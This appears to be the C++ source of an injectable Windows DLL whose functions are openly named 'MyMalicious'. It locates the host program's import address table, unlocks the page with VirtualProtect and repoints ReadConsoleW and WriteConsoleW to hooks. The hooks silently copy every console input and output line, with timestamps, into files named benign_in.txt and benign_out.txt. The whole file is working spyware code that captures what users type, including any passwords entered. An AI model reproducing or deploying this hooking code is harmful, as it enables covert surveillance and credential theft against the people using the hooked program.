// injected-2.cpp : Defines the exported functions for the DLL application.
#define _CRT_SECURE_NO_WARNINGS
#include <fstream>
#include <ctime>
#include <algorithm>

#include "injected-2.h"

void** getFunctionAddress(string const& const wantedFunctionName, string const& const wantedDllName) {
	//Get base address of current exe
	HMODULE const hModule = GetModuleHandle(NULL);
	if (hModule == NULL)
		return 0;

	//Get pointer to DOS header and NT header
	IMAGE_DOS_HEADER const* const pDOSHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(hModule);
	if (pDOSHeader == NULL)
		return 0;

	BYTE const* const b_pDOSHeader = reinterpret_cast<BYTE const* const>(pDOSHeader);

	//Get pointer to NT header
	IMAGE_NT_HEADERS const* const pNTHeader = reinterpret_cast<IMAGE_NT_HEADERS const* const>(b_pDOSHeader + pDOSHeader->e_lfanew);
	if (pNTHeader == NULL)
		return 0;

	//Get pointer to import descriptor
	IMAGE_IMPORT_DESCRIPTOR* const pImportDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR* const>(const_cast<BYTE * const>(b_pDOSHeader) + pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	if (pImportDesc == NULL)
		return 0;

	//Go over DLLs
	for (IMAGE_IMPORT_DESCRIPTOR const* pCurrentDll = pImportDesc; pCurrentDll != 0; pCurrentDll++) {
		string const name(reinterpret_cast<char const* const>(pDOSHeader) + pCurrentDll->Name);
		if (pCurrentDll->Name == 0) 
			break;

		OutputDebugStringA(("[INFO] DLL name: " + name).c_str());
		
		if (!_stricmp(name.c_str(), wantedDllName.c_str())) {
			// Found wantedDllName
			//Get pointer to FirstThunk (IAT) and OriginalFirstThunk (INT)
			IMAGE_THUNK_DATA const* const pCurrentThunk = reinterpret_cast<IMAGE_THUNK_DATA const* const>(b_pDOSHeader + pCurrentDll->FirstThunk);
			IMAGE_THUNK_DATA const* const pOriginalFirstThunk = reinterpret_cast<IMAGE_THUNK_DATA const* const>(b_pDOSHeader + pCurrentDll->OriginalFirstThunk);

			//Go over IAT and INT and find function
			for (int i = 0; (pOriginalFirstThunk + i)->u1.AddressOfData != NULL; i++) {
				IMAGE_IMPORT_BY_NAME const* const pImportByName = reinterpret_cast<IMAGE_IMPORT_BY_NAME const* const>(b_pDOSHeader + (pOriginalFirstThunk + i)->u1.AddressOfData);
				string const functionName(pImportByName->Name);
				if (functionName == wantedFunctionName) {
					OutputDebugStringA(("[INFO] Found: " + functionName).c_str());
					return (void**)(pCurrentThunk + i);
				}
				OutputDebugStringA(("[INFO] Current function name: " + functionName).c_str());
			}
		}
	}
	return 0;
}

void writeToFile(string const& const _Filename, string const& const opening, void const* lpBuffer, MyMalicious const& const func) {
	char delimiter;
	switch (func)
	{
	case _MyMaliciousReadConsoleW:
		delimiter = '\r';
		break;
	case _MyMaliciousWriteConsoleW:
		delimiter = '\0';
		break;
	default:
		break;
	}
	ofstream myfile;
	myfile.open(_Filename, ios::app);

	time_t timev = time(NULL);
	char * const s_asctime = asctime(localtime(&timev));
	*std::remove(s_asctime, s_asctime + strlen(s_asctime), '\n') = '\0'; // removes _all_ new lines.

	myfile << "[" << s_asctime << "]" << " " << opening.c_str();

	LPCWSTR it = (LPCWSTR)lpBuffer;
	while (it[0] != delimiter)
	{
		myfile << string(it, it + 1).c_str();
		it++;
	}

	if (func == _MyMaliciousReadConsoleW)
		myfile << endl;

	myfile.close();
}

//ReadConsole
BOOL WINAPI MyMaliciousReadConsoleW(
	_In_     HANDLE  hConsoleInput,
	_Out_    LPVOID  lpBuffer,
	_In_     DWORD   nNumberOfCharsToRead,
	_Out_    LPDWORD lpNumberOfCharsRead,
	_In_opt_ PCONSOLE_READCONSOLE_CONTROL  pInputControl
)
{
	writeToFile("benign_in.txt", "[INPUT ] > ", lpBuffer, _MyMaliciousReadConsoleW);
	return ReadConsole(hConsoleInput, lpBuffer, nNumberOfCharsToRead, lpNumberOfCharsRead, pInputControl);
}



//WriteConsole
BOOL WINAPI MyMaliciousWriteConsoleW(
	_In_             HANDLE  hConsoleOutput,
	_In_       const VOID    *lpBuffer,
	_In_             DWORD   nNumberOfCharsToWrite,
	_Out_            LPDWORD lpNumberOfCharsWritten,
	_Reserved_       LPVOID  lpReserved
)
{
	BOOL const ret = WriteConsole(hConsoleOutput, lpBuffer, nNumberOfCharsToWrite, lpNumberOfCharsWritten, lpReserved);
	writeToFile("benign_out.txt", "[OUTPUT] > ", lpBuffer, _MyMaliciousWriteConsoleW);
	return ret;
}


void PatchIAT(string const& const wantedFunctionName, string const& const wantedDllName, MyMalicious const& const func) {
	//Get pointer to MessageBoxA function
	void** pFunc = getFunctionAddress(wantedFunctionName, wantedDllName);
	
	//Variable to preserve old rights of page
	DWORD old_rights; 

	VirtualProtect(pFunc, sizeof(void*), PAGE_EXECUTE_READWRITE, &old_rights); // Change Page permissions

	// We patch IAT of ReadConsoleW and WriteConsoleW, we use this function for both cases
	// so we identify the cases using the MyMalicious enum 
	switch (func)
	{
		// The ReadConsoleW function change
	case _MyMaliciousReadConsoleW:
		*pFunc = MyMaliciousReadConsoleW; 
		break;
		// The WriteConsoleW function change
	case _MyMaliciousWriteConsoleW:
		*pFunc = MyMaliciousWriteConsoleW; 
		break;
	default:
		break;
	}

	//Preserve old rights of page
	VirtualProtect(pFunc, sizeof(void*), old_rights, NULL); 
}